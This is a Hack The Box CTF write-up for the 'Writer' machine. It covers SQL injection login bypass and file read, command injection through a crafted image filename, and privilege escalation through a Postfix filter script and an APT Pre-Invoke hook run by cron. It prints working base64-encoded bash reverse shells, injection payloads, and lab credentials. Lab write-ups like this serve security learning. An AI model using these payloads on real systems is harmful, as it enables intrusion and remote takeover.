## HTB Writer (Medium) - Writeup

Difficulty: Medium

Writer was a cool and challenging box that required digging into source code, SQL injection, and chaining a few clever tricks to get root.  
I started with an SQL injection that allowed both authentication bypass and file read, which exposed the application’s source code.  
From there, I exploited a command injection vulnerability in the image upload functionality by chaining local file access with a manipulated filename.  
With a shell as www-data, I extracted Django credentials, cracked a user hash, and pivoted to kyle.  
Privilege escalation to john was achieved by injecting a reverse shell into a Postfix mail filter script and triggering it via SMTP.  
Finally, I abused write access to an APT config file to escalate to root through a cron-executed apt-get hook.  

---

## Nmap 

#### The nmap scan revealed four open ports:  

![obraz](https://github.com/user-attachments/assets/0db0f792-0a0c-4113-bb00-0656c1308ca3)



## Port 445 - SMB

When I encounter SMB or FTP, I usually start my enumeration there by checking for anonymous or guest login.  
For smb it can be done with netexec tool:  
```
nxc smb 10.10.11.101 -u 'a' -p ''
```


![obraz](https://github.com/user-attachments/assets/de573a80-0cac-472a-aee0-f8a234c73770)

It worked let's check shares now:  
```
nxc smb 10.10.11.101 -u 'a' -p '' --shares
```

![obraz](https://github.com/user-attachments/assets/087145ef-f172-42e4-bae4-1eb5b085a0b7)

Unfortunately, no shares were accessible, so I moved on to enumerating the HTTP service.    



## Port 80 - Website  

I'll add writer.htb to /etc/hosts   

![obraz](https://github.com/user-attachments/assets/19e4c07c-18ee-4652-b739-b08e2a925c59)

on "About" page we found an email:  
+  admin@writer.htb  

There is also contact page but it doesn't work.  
Next, I performed subdomain fuzzing using wfuzz, but it didn’t yield any results:  

![obraz](https://github.com/user-attachments/assets/0fa1d7cf-e985-4143-8c5e-e040ea89e28b)


After that I did directory busting with wfuzz:  

![obraz](https://github.com/user-attachments/assets/03453099-c2f4-4970-95b7-a631cba49a9f)

![obraz](https://github.com/user-attachments/assets/620e8f20-40e3-43a7-87ae-275bd703ef6a)

It has found /administrative directory.  
It contains a login page:  

![obraz](https://github.com/user-attachments/assets/59df1d83-f5b4-4323-b5f3-c57cbea2d33b)

First I tried brute-forcing with hydra - didn't work:  
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.101 http-post-form "/administrative:username=^USER^&password=^PASS^:Incorrect credentials"
```

![obraz](https://github.com/user-attachments/assets/59c3cdb7-2004-40b4-b850-676eca5ea461)

It turned out that  simple sql injection worked for authentication bypass.  
Username field was injectable:  
```
' or 1=1-- -
```

![obraz](https://github.com/user-attachments/assets/5f365bec-d109-4709-b42e-c9ba36b2cf47)

We get logged in.  
I tried uploading an image with webshell but it didn't work.  


## Exploitation with Sqlmap  

Then I changed approach and came back to sql injection.  
We've ran sqlmap on username parameter.  
First we need to catch login request with burpsuite:  

![obraz](https://github.com/user-attachments/assets/880a2328-3f02-4de3-9ff5-fa04600b8e3b)

Then we ran sqlmap:  

![obraz](https://github.com/user-attachments/assets/195ebf5e-cc80-40ba-974a-789aff8f2eb8)

![obraz](https://github.com/user-attachments/assets/25d3f0ef-b9d9-4d49-9bf2-33368cb40e98)

From there it's a standard workflow - discover database name, then table names, then dump specific table:  
```
sqlmap -r req.txt --dbs --batch
```
![obraz](https://github.com/user-attachments/assets/6b957db9-05cc-4331-9776-82609992b021)

![obraz](https://github.com/user-attachments/assets/0182ea85-2fca-4247-8534-7230c39e4ec3)

Now we want to find table names in "Writer" database:  
```
sqlmap -r req.txt -D writer --tables --batch
```

![obraz](https://github.com/user-attachments/assets/79fd6d8d-43d1-441d-861b-78818c587b34)

Users table will most likely contain password hash which is a thing of interest ofc.  
```
+----+------------------+----------+----------------------------------+----------+--------------+
| id | email            | status   | password                         | username | date_created |
+----+------------------+----------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active   | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+----------+----------------------------------+----------+--------------+
```
```
sqlmap -r req.txt -D writer -T users --dump --batch
```

![obraz](https://github.com/user-attachments/assets/5575885c-496a-4083-9398-8122021561a4)

Unfortunately this hash is uncrackable.  

It could be done manually too of course, here's how to do it:  
```
uname=test' UNION select 1,password,3,4,5,6 from users-- -&password=test
```



## SQL - privileges and file read

With sqlmap we can also check privileges, syntax is as follows:  
```
sqlmap -r req.txt --privileges
```

![obraz](https://github.com/user-attachments/assets/253f5fbb-1b00-4172-8ba7-bc09e76887ec)

![obraz](https://github.com/user-attachments/assets/764d8528-7fd3-447e-a5ad-717d7c602f85)

We have "FILE" privilege.  
It allows us to write and read files.
I tried to write a file but that didn't work, let's try reading a file.  
Payload is as follows:  
```
uname=test' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6 -- -&password=test	
```

![obraz](https://github.com/user-attachments/assets/3b1d0cff-30b2-4022-b473-feaa69743bd1)

Then I tried to look for low hanging fruits which are ssh keys of each "real" user.  
It didn't work, meaning we have to enumerate the system.  
From nmap we know that the website runs apache2.  
We can try to look for apache config files:  
+  /etc/apache2/apache2.conf (nothing intresting)
+  /etc/apache2/sites-available/000-default.conf

I'll paste the second file here:  
```
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

It gave us .wsgi file path, this is the next thing we're going to view:  
```python
#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")
```

The important line is:  
+  from writer import app as application
It means that there is likely "writer" directory and __init__.py in it, let's view that:
```
/var/www/writer.htb/writer/__init__.py
```

I'll paste here only the intresting part:  
```
# Image URL handling 
        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if image_url.endswith('.jpg'):
                try:
                    local_filename, _ = urllib.request.urlretrieve(image_url)
                    os.system(f"mv {local_filename} {local_filename}.jpg")
                    image_path = f"{local_filename}.jpg"
                    try:
                        im = Image.open(image_path)
                        im.verify()
                        im.close()
                        image_path = image_path.replace('/tmp/', '')
                        os.system(f"mv /tmp/{image_path} /var/www/writer.htb/writer/static/img/{image_path}")
                        image_path = f"/img/{image_path}"
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s;", {'image': image_path, 'id': id})
                        connector.commit()
                    except UnidentifiedImageError: 
                        os.system(f"rm {image_path}")  
                        error = "Not a valid image file!"
                        return render_template('edit.html', error=error, results=results, id=id)
                except:
                    error = "Issue uploading picture"
                    return render_template('edit.html', error=error, results=results, id=id)
            else:
                error = "File extensions must be .jpg!"
                return render_template('edit.html', error=error, results=results, id=id)
```

Reading through this part of the code I believe we can inject commands into the filename.  
We need to go to /dashboard/stories/add and catch a request with burp:  

![obraz](https://github.com/user-attachments/assets/58b8e811-3f00-4be4-9a70-fc6e9b5b2c04)


![obraz](https://github.com/user-attachments/assets/2698ecc2-799c-4a2c-80e4-ce90edb9342c)

We need to use image_url as specified in the code.  
In order to exploit it we need to create a file called:  
```
shell.jpg;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDAwICAwPiYxCg== | base64 -d | bash;
```

This base64 part is our reverse shell.  
It can be done with touch:  
```
touch -- 'shell.jpg;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDAwICAwPiYxCg== | base64 -d | bash;'
```

Now upload it the normal way:  

![obraz](https://github.com/user-attachments/assets/3ee75aa5-fe29-49a7-a175-e87c934299cb)

Then come back to burpsuite and add this line under image_url parameter:  

```
file:///var/www/writer.htb/writer/static/img/shell.jpg;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDAwICAwPiYxCg== | base64 -d | bash;
```

![obraz](https://github.com/user-attachments/assets/65d6e9bc-4e37-4b36-9ade-d021e88aa1f9)
  

We got a connection back!  

![obraz](https://github.com/user-attachments/assets/ab8f04f6-bfe1-470c-ab00-a4eaa8a5148b)



## Priv Esc 1  

In /var/www there are three directories:  
+ html
+ writer.htb
+ writer2_project

html is empty, writer.htb has the source code we already viewed, let's check writer2_project:  

![obraz](https://github.com/user-attachments/assets/d7058be5-fb60-4bcc-a677-dbb5934a45e8)

```
import os
{% raw %}
# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/1.10/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'q2!1iwm^9jlx@4u66k(ke!_=(5uacvl@%%(g&6=$$m1u5n=*4-'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = False

ALLOWED_HOSTS = ['127.0.0.1']


# Application definition

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'django.contrib.humanize',
    'writer_web'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'writerv2.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'writerv2.wsgi.application'


# Database
# https://docs.djangoproject.com/en/1.10/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
        },
    }
}


# Password validation
# https://docs.djangoproject.com/en/1.10/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/1.10/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/1.10/howto/static-files/

STATIC_URL = '/static/'

STATICFILES_DIRS = (
    os.path.join(BASE_DIR, 'static'),
)

STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles') {% endraw %}
```

I'll paste the important lines here:  
```
{% raw %}
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
        },
    }
} {% endraw %}
```

It means that there is a second database and there is also a path to config file, let's view it:  

```
www-data@writer:/var/www/writer2_project/writerv2$ cat /etc/mysql/my.cnf

# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

We found credentials for "dev" database:  
+ djangouser:DjangoSuperPassword

We can connect with this command and paste the password:  
```
mysql -u djangouser -p
```
Let's take a look at the tables that exist in this db:  

![obraz](https://github.com/user-attachments/assets/1829f4cc-6e99-40cf-b405-0b0ac9f84bf0)

We can now use "describe" command on the intresting table and then view it:  

![obraz](https://github.com/user-attachments/assets/0fe3afd1-327b-451f-b755-d1baba1569f4)

To crack this hash we can use hashcat's mode 10000:  

![obraz](https://github.com/user-attachments/assets/5427ccc6-e76f-434f-8bc7-04adb22c895e)

![obraz](https://github.com/user-attachments/assets/5724c4b0-ebc4-4c18-9abf-ad2551a7f749)

It cracked:  
+  kyle:marcoantonio

Now we're able to connect via ssh and retrieve the flag:  

![obraz](https://github.com/user-attachments/assets/7ea72473-a6a4-482b-beda-68c3d72fa01f)



## Priv Esc to john  

After some quick enumeration I found an intresting looking group:  

![obraz](https://github.com/user-attachments/assets/ee75d3b0-a98e-4768-baa6-74803738f0ec)

Let's check what can we run as this group member:  
```
find / -group filter  2>/dev/null
```

![obraz](https://github.com/user-attachments/assets/dd725665-4440-49df-aa91-fb4fe7ebcd12)

We got two results:  
+  /etc/postfix/disclaimer
+  /var/spool/filter

On hacktricks there is a post about postfix:  
```
"Usually, if installed, in /etc/postfix/master.cf contains scripts to execute when for example a new mail is receipted by a user.
 For example the line flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient} means that /etc/postfix/filtering will be executed if a new mail is received by the user mark."
```

Let's check master.cf on our file:  
```
cat /etc/postfix/master.cf
```
```
flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

It will execute "disclaimer" as user john when a new mail is recieved.  
Luckily we own disclaimer binary, meaning we can just add a revshell there and send a mail and it will execute as john.  

![obraz](https://github.com/user-attachments/assets/3fe9a4f8-7068-42d1-953a-942e2699178a)

To send a mail we will connect to port 25 on localhost:  
```
nc 127.0.0.1 25
```
Those are all the command we will paste one by one:  
```
HELO writer.htb
mail from: r00ter@writer.htb
RCPT TO: root@writer.htb
DATA
Subject: shell
revshell
.
quit
```

![obraz](https://github.com/user-attachments/assets/4ca2b3a7-0f1e-4ca2-ae06-c32c56b4290d)

I believe that recipient has to be an existing account.  
We had to be quick becasue disclaimer script cleans itself every 2 minutes or so.  

![obraz](https://github.com/user-attachments/assets/0153f8d3-c717-41a8-8f67-3ca542a2f5c0)

For a simpler access we will add ssh key, first we need to generate one:  

![obraz](https://github.com/user-attachments/assets/407c7cef-9a5c-437f-99ac-b41305ff5be5)

And then add it:  

![obraz](https://github.com/user-attachments/assets/9e596712-2a40-46cb-8659-2c7ffe265932)

As result we can connect with private key via ssh:  

![obraz](https://github.com/user-attachments/assets/b2a9bdb2-7d52-48d4-938f-d499a148a352)



## Priv Esc to root

Again we're in an interesting group:  

![obraz](https://github.com/user-attachments/assets/f6364344-aee8-4cd7-8e6a-c1ad56416b0f)

We own apt config file meaning we could change it, but we still can't run apt-get to execute anything as root.  
But maybe it runs as a cron job, I'll run pspy64 and wait for any crons:  (it can be found on github)  
```
./pspy64
```
![obraz](https://github.com/user-attachments/assets/ab38ce71-7d50-4223-bf73-09a393d3ef99)

There is one:
```
/usr/bin/apt-get update
```

Looking at gtfobins we see a way to execute commands with it:  
```
https://gtfobins.github.io/gtfobins/apt-get/
```

It normally can be done like that:  
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

But we can also put this line in a config file:  
```
APT::Update::Pre-Invoke::=/bin/sh
```

I will put base64 encoded reverse shell in there:  
```
{% raw %} APT::Update::Pre-Invoke {"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS85MDA1ICAwPiYxCg== |base64 -d |bash"}; {% endraw %}
```
![obraz](https://github.com/user-attachments/assets/f5a5d51d-cdc4-43e1-9bcd-5810446a3aa4)

After that we start a listener and wait for cron to run:  

![obraz](https://github.com/user-attachments/assets/38af822d-d015-4c87-a6c2-7e87a8c1c75c)

Thanks for reading!  












































